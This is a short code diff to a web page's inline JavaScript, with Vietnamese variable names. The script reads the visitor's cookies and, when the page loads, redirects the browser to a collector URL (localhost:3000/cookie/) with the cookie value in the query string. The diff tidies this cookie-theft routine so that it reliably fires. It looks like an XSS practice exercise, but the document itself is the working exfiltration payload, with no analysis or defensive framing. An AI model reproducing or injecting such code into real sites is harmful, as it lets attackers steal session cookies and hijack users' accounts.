@@ -16,15 +16,18 @@
                 return ca[i];
             }
         }
-        return ;
+        return '';
     }
-    var gia_tri_cookie = xetCookie();
-    function Redirect(){
+
+    function Redirect(gia_tri_cookie){
         console.log(gia_tri_cookie);
         window.location="http://localhost:3000/cookie/?gia_tri_cookie="+ gia_tri_cookie+"";
     }
+
+
     document.addEventListener("DOMContentLoaded", function() {
-        Redirect();
+        let gia_tri_cookie = xetCookie();
+        Redirect(gia_tri_cookie);
     });
 </script>
 </body>
